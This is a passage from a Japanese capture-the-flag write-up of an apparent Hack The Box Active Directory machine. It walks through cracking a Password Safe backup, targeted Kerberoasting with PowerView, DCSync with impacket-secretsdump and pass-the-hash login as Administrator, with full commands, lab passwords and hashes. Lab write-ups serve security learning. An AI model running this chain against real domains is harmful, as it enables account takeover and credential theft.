        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        SYSVOL                                                  READ ONLY       Logon server share 
[*] Closed 1 connections     
```

#### FTP
- ログインできて、Backup.psafe3が見つかった
```sh
└─$ ftp -p $Target_IP
Connected to 10.129.57.119.
220 Microsoft FTP Service
Name (10.129.57.119:kali): BENJAMIN
331 Password required
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||58083|)
125 Data connection already open; Transfer starting.
10-05-24  09:13AM                  952 Backup.psafe3
226 Transfer complete.
ftp> 

```

ファイルの属性を見る
- 普通にパスワードかかってそうだからクラックする必要がある
```sh
└─$ file Backup.psafe3                                             
Backup.psafe3: Password Safe V3 database
```

#### Backup.psafe3のクラック
以下のサイトでjohnの形式に変換

これは使わないほうがいい
- https://hashes.com/en/johntheripper/pwsafe2john
	- いてレーション

ファイルアップロードすると、以下のハッシュが出力される
```sh
└─$ pwsafe2john Backup.psafe3
Backu:$pwsafe$*3*4ff588b74906263ad2abba592aba35d58bcd3a57e307bf79c8479dec6b3149aa*2048*1a941c10167252410ae04b7b43753aaedb4ec63e3f18c646bb084ec4f0944050
```

ファイルに書き込む
```sh
echo '$pwsafe$*3*4ff588b74906263ad2abba592aba35d58bcd3a57e307bf79c8479dec6b3149aa*524288*1a941c10167252410ae04b7b43753aaedb4ec63e3f18c646bb084ec4f0944050' > backup_hash.txt
```

クラックできた
**Backup.psafe3ファイルのパスワードは、「tekieromucho」だとわかる**
```sh
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt backup.hash                                                                                            
Using default input encoding: UTF-8
Loaded 1 password hash (pwsafe, Password Safe [SHA256 128/128 ASIMD 4x])
Cost 1 (iteration count) is 2048 for all loaded hashes
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
tekieromucho     (Backu)     
1g 0:00:00:00 DONE (2025-06-16 02:16) 5.000g/s 30720p/s 30720c/s 30720C/s adriano..iheartyou
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```


.psafe3を開くために、Password safeをインストールする
```sh
sudo apt install passwordsafe
```

ファイルを選択してパスワード入れて開く
パスワードを開くには、フォルダ？押して、Edit...~を押すとポップアップが出てくるので、それを読めばいい
![](https://i.imgur.com/PDylkYT.png)

#### 抽出した認証情報
alexander : UrkIbagoxMyUGw0aPlj9B0AXSea4Sw
emily : UXLCI5iETUsIBoFVTj8yQFKoHjXmb
emma : WwANQWnmJnGV07WQN8bMS7FMAbjNur


### EMILY
そういえば、MICHAELとしてwinrmにログインしたとき、emilyいたな
```sh
─$ evil-winrm -i  $Target_IP -u MICHAEL  -p newP@ssword2022 

<SNIP>

*Evil-WinRM* PS C:\Users> ls


    Directory: C:\Users


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----        10/22/2024  11:46 AM                Administrator
d-----        10/30/2024   2:25 PM                emily
d-----         6/16/2025   8:16 AM                michael
d-r---         10/4/2024  10:08 AM                Public


*Evil-WinRM* PS C:\Users> 

```

emilyとしてログイン
- user.txtを取得
```sh
└─$ evil-winrm -i  $Target_IP -u emily  -p UXLCI5iETUsIBoFVTj8yQFKoHjXmb
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\emily\Documents> ls
*Evil-WinRM* PS C:\Users\emily\Documents> cd ../
*Evil-WinRM* PS C:\Users\emily> ls


    Directory: C:\Users\emily


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-r---        10/30/2024   2:23 PM                3D Objects
d-r---        10/30/2024   2:23 PM                Contacts
d-r---        10/30/2024   5:17 PM                Desktop
d-r---        10/30/2024   2:23 PM                Documents
d-r---        10/30/2024   2:23 PM                Downloads
d-r---        10/30/2024   2:23 PM                Favorites
d-r---        10/30/2024   2:23 PM                Links
d-r---        10/30/2024   2:23 PM                Music
d-r---        10/30/2024   2:23 PM                Pictures
d-r---        10/30/2024   2:23 PM                Saved Games
d-r---        10/30/2024   2:23 PM                Searches
d-r---        10/30/2024   2:23 PM                Videos


*Evil-WinRM* PS C:\Users\emily> cd Desktop
*Evil-WinRM* PS C:\Users\emily\Desktop> ls


    Directory: C:\Users\emily\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        10/30/2024   2:23 PM           2308 Microsoft Edge.lnk
-ar---         6/16/2025   4:28 AM             34 user.txt


*Evil-WinRM* PS C:\Users\emily\Desktop> type user.txt
```

# Privilege Escalation
## ETHANの奪取


Emilyをbloodhoundで見てたら、ETHANに対して、GenericWriteアクセスをもってるのがわかった
- 一般書き込み
	- ETHANの保護されてない属性。グルーピュのmembersやユーザーのSPNに対して書き込みできる
	- この時、ターゲットKerberoastingやShadow Credential攻撃できる
![](https://i.imgur.com/7rtNQBM.png)


とりあえず、LinuxからShadow Credential攻撃してみる
- うまくいかない
```sh
└─$ pywhisker -d "administrator.htb" -u "emily" -p "UXLCI5iETUsIBoFVTj8yQFKoHjXmb" --target "ethan" --action "add" 
[!] error receiving data: [Errno 104] Connection reset by peer

```

- LDAPサーバは 匿名バインド（認証なしアクセス）を拒否している
	- LDAP経由の Shadow Credentials はこの環境では実行不可能？？
```sh
└─$ ldapsearch -x -H ldap://10.129.57.119 -b "DC=administrator,DC=htb"
# extended LDIF
#
# LDAPv3
# base <DC=administrator,DC=htb> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# search result
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090C78, comment: In order to perform this opera
 tion a successful bind must be completed on the connection., data 0, v4f7c

# numResponses: 1
```


evilwinrmから、Windowsの方でやってみる
### ターゲット型 Kerberoasting 攻撃
PowerView.ps1を取得・アップロード
- https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1

emilyの認証情報の設定
```sh
$SecPassword = ConvertTo-SecureString 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('administrator.htb\emily', $SecPassword)
```

SPNの追加
```sh
Set-DomainObject -Credential $Cred -Identity ethan -Set @{serviceprincipalname='http/ethan.administrator.htb'}
```

チケット取得
```sh
*Evil-WinRM* PS C:\Users\emily\Documents> Get-DomainSPNTicket -Credential $Cred -SPN 'http/ethan.administrator.htb'
Warning: [Invoke-UserImpersonation] powershell.exe is not currently in a single-threaded apartment state, token impersonation may not work.
Warning: [Invoke-UserImpersonation] Executing LogonUser() with user: administrator.htb\emily


SamAccountName       : UNKNOWN
DistinguishedName    : UNKNOWN
ServicePrincipalName : http/ethan.administrator.htb
TicketByteHexStream  :
Hash                 : $krb5tgs$23$*UNKNOWN$UNKNOWN$http/ethan.administrator.htb*$C4BE2BA79020B8206DC522186AE6083D$0DA63E6803E94FA339FF6EAEBA2C8BE835B67B9C9A9A30FCF70106FD19CAAD18A6C6CC08C6CDC7B6DE8956A9FBFF372B5172674484A3007D9246C434DBE8A6F934FDE1
                       01376AF94765067AE84D59B2DB7910084A1FB661EFFD168FA6F6C0510DC375843F4E6B512C643A7CAD76C3AB73F64D0313F234AEF51310F96C12F5E49369671FC0C50863BF388094D14B8EEE7D93940A277C83A0E4189FDF249CB95C05AEC90CE86F5A71DB624C5C6BAB52B638C6EC1038
                       70FFE19C98DA7EA8D9A6C61C1E3D122371276BE9E42F3CCFB8F1B988954540C949622677C25B9FA04D298912A11A2BC9EA1C72F52F19C827296F3596000A108D9FC356CA03D0DB118B2A5F38DE1128A74AD7E4E8915651B610B3718CC5F41E3D855FDA55BF52CA83834FBBAF33FE5182A4
                       A04D97146A9B78A7C3A0A8CCBDCFD0DE3F1615B70E2E16700A0237893ABD69BE01747E8AE092AFBB467E838B355A69B82543CA813003CD979EBB789514213029C67DCB6EBB68150A5E5D3EBBAC7D4939D4F499F38FA8117B78FE542D5B273484D6708A5306EB802FC8BC92627B96434B71
                       015794600C58BBFBC14AFF535641BD5C90D77BF8C7ED198A938756F52D2CAC21303463257911FFC0B8685187648FC6840EFC6D61D97D20E64D09B25E6178DDAF0A128CFBCB0B11056E01DA28963701E8376A93CAB69FED003D2C923DED4DA5E1392A057182BF219E64D00F3FA53E1FCE46
                       ECBB2B04113C48E2CA8085DF359A3F5E699FAD4DB633E2C26ED88E0A8C999CC70BDC79C9035EDACC6D468A745BC12651EC938A3302825540877265ABCA30D2AE6E67072C82898DDA108B67170280513369400B59D42E629E59E7C1D8B64496B5A3027FA4D26C0C46AF3F4F58A977D0F55D
                       3619A5E06D6AA440B1A00DA7CAD95A1C0C36346024CE7B0FC27188FCC4BB61AF1633EEF9467A7A3C01273BAB5C8704044470918F3C2854142280219B0F127730ABFC372E33622CF620C78DA500005D15E1FD8EE5B608C30829D6AEFBBB21124E4A07317EFA547B69AE6B98F4F1098CFD38
                       3D61AD15D066BDB7414D0F9104619E8D7D199C81B99F0DB70AA9BBF8AA00F0F713EA05DA120B1A4A74D593F7C10A7D7539926CD5002CB57DDB02CC04833552B947B79729FE2AAF3E781D318631D325A42AC70EE7EE21183A75AA30F4A433C01F813393D79018F12C1C9BE2A68AE6440F97
                       5CEBB1B24CECDAC5BAC608FC5F5E3E0D8BE86EDD2B4A1385836A2566D6CE6ADD1F892946E62EABD2726FE03E5A3C9B6198B6A9FD0AB7F87DA170C05AE51520773FFD3F284B8CD1AF9B2307CE064EA99C0A1620B577F802D18A6FB3C2924B3A0025035E3A104C4CB06B9245DC5773D0F431
                       1132B06AA8E6AF767EAE16155C8735BFF1F09C84DD1C2064DDAED0352C04E856E37CB3775D26FB15E6A6F519B2601FE4DD6054A3FAF0FDEBEB8C75DCFAA8CDD87871EC9784DF5DFF743706723DFE510DBC950CC5A97D990E8F36E2FD3BF7CD0705E7565BED22BDFF9E50CF2399CD5BECFD
                       64C410F83CDF207ACF8123ADCF4D42A85A19D622FA520DAC2917E6972BED1C6DF0C4608C2F9A4C307854A06FFD78307D88748B796211D18891B13352072BA4E1FD20F7C14B1225B13C245C6CA3FF4C00A68655FB18E7E0597A0FFDA25723F7E8FEFE9DDA3F1A0BD2B41A967785B71411BE
                       D4BB85932719059852AD3B26

Warning: [Invoke-RevertToSelf] Reverting token impersonation and closing LogonUser() token handle
```


```sh
echo '$krb5tgs$23$*UNKNOWN$UNKNOWN$http/ethan.administrator.htb*$C4BE2BA79020B8206DC522186AE6083D$0DA63E6803E94FA339FF6EAEBA2C8BE835B67B9C9A9A30FCF70106FD19CAAD18A6C6CC08C6CDC7B6DE8956A9FBFF372B5172674484A3007D9246C434DBE8A6F934FDE101376AF94765067AE84D59B2DB7910084A1FB661EFFD168FA6F6C0510DC375843F4E6B512C643A7CAD76C3AB73F64D0313F234AEF51310F96C12F5E49369671FC0C50863BF388094D14B8EEE7D93940A277C83A0E4189FDF249CB95C05AEC90CE86F5A71DB624C5C6BAB52B638C6EC103870FFE19C98DA7EA8D9A6C61C1E3D122371276BE9E42F3CCFB8F1B988954540C949622677C25B9FA04D298912A11A2BC9EA1C72F52F19C827296F3596000A108D9FC356CA03D0DB118B2A5F38DE1128A74AD7E4E8915651B610B3718CC5F41E3D855FDA55BF52CA83834FBBAF33FE5182A4A04D97146A9B78A7C3A0A8CCBDCFD0DE3F1615B70E2E16700A0237893ABD69BE01747E8AE092AFBB467E838B355A69B82543CA813003CD979EBB789514213029C67DCB6EBB68150A5E5D3EBBAC7D4939D4F499F38FA8117B78FE542D5B273484D6708A5306EB802FC8BC92627B96434B71015794600C58BBFBC14AFF535641BD5C90D77BF8C7ED198A938756F52D2CAC21303463257911FFC0B8685187648FC6840EFC6D61D97D20E64D09B25E6178DDAF0A128CFBCB0B11056E01DA28963701E8376A93CAB69FED003D2C923DED4DA5E1392A057182BF219E64D00F3FA53E1FCE46ECBB2B04113C48E2CA8085DF359A3F5E699FAD4DB633E2C26ED88E0A8C999CC70BDC79C9035EDACC6D468A745BC12651EC938A3302825540877265ABCA30D2AE6E67072C82898DDA108B67170280513369400B59D42E629E59E7C1D8B64496B5A3027FA4D26C0C46AF3F4F58A977D0F55D3619A5E06D6AA440B1A00DA7CAD95A1C0C36346024CE7B0FC27188FCC4BB61AF1633EEF9467A7A3C01273BAB5C8704044470918F3C2854142280219B0F127730ABFC372E33622CF620C78DA500005D15E1FD8EE5B608C30829D6AEFBBB21124E4A07317EFA547B69AE6B98F4F1098CFD383D61AD15D066BDB7414D0F9104619E8D7D199C81B99F0DB70AA9BBF8AA00F0F713EA05DA120B1A4A74D593F7C10A7D7539926CD5002CB57DDB02CC04833552B947B79729FE2AAF3E781D318631D325A42AC70EE7EE21183A75AA30F4A433C01F813393D79018F12C1C9BE2A68AE6440F975CEBB1B24CECDAC5BAC608FC5F5E3E0D8BE86EDD2B4A1385836A2566D6CE6ADD1F892946E62EABD2726FE03E5A3C9B6198B6A9FD0AB7F87DA170C05AE51520773FFD3F284B8CD1AF9B2307CE064EA99C0A1620B577F802D18A6FB3C2924B3A0025035E3A104C4CB06B9245DC5773D0F4311132B06AA8E6AF767EAE16155C8735BFF1F09C84DD1C2064DDAED0352C04E856E37CB3775D26FB15E6A6F519B2601FE4DD6054A3FAF0FDEBEB8C75DCFAA8CDD87871EC9784DF5DFF743706723DFE510DBC950CC5A97D990E8F36E2FD3BF7CD0705E7565BED22BDFF9E50CF2399CD5BECFD64C410F83CDF207ACF8123ADCF4D42A85A19D622FA520DAC2917E6972BED1C6DF0C4608C2F9A4C307854A06FFD78307D88748B796211D18891B13352072BA4E1FD20F7C14B1225B13C245C6CA3FF4C00A68655FB18E7E0597A0FFDA25723F7E8FEFE9DDA3F1A0BD2B41A967785B71411BED4BB85932719059852AD3B26' > ethan.hash
```

hashcatでクラック
```sh
hashcat -m 13100 -a 0 ethan.hash /usr/share/wordlists/rockyou.txt

<SNIP>
...7cb3775d26fb15e6a6f519b2601fe4dd6054a3faf0fdebeb8c75dcfaa8cdd87871ec9784df5dff743706723dfe510dbc950cc5a97d990e8f36e2fd3bf7cd0705e7565bed22bdff9e50cf2399cd5becfd64c410f83cdf207acf8123adcf4d42a85a19d622fa520dac2917e6972bed1c6df0c4608c2f9a4c307854a06ffd78307d88748b796211d18891b13352072ba4e1fd20f7c14b1225b13c245c6ca3ff4c00a68655fb18e7e0597a0ffda25723f7e8fefe9dda3f1a0bd2b41a967785b71411bed4bb85932719059852ad3b26:limpbizkit

Session..........: hashcat
Status...........: Cracked
<SNIP>
```


### ethan認証情報
ethan : limpbizkit

## DCSync
で、ethanは、ADMINISTRATOR.HTBドメインに対して、DCSyncアクセスできる
- DCSync
	- 以下の2つの権限を持っている時にできる
		- DS-Replication-Get-Changes
		- DS-Replication-Get-Changes-All
	- ドメインコントローラーのふりをして任意のユーザーのNTLMハッシュを引き出す攻撃
![](https://i.imgur.com/KzTbmlx.png)


impacketのsecretsdump.pyを使用して、DCSync攻撃を行う
```sh
└─$ impacket-secretsdump administrator.htb/ethan:limpbizkit@10.129.57.119 -just-dc-user Administrator
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:9d453509ca9b7bec02ea8c2161d2d340fd94bf30cc7e52cb94853a04e9e69664
Administrator:aes128-cts-hmac-sha1-96:08b0633a8dd5f1d6cbea29014caea5a2
Administrator:des-cbc-md5:403286f7cdf18385
[*] Cleaning up... 

```


取得したNTLMを使って、winrmでログイン
```sh
└─$ evil-winrm -i 10.129.57.119 -u Administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> ls
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---         6/16/2025   4:28 AM             34 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt

```



![](https://i.imgur.com/nOM21RQ.png)
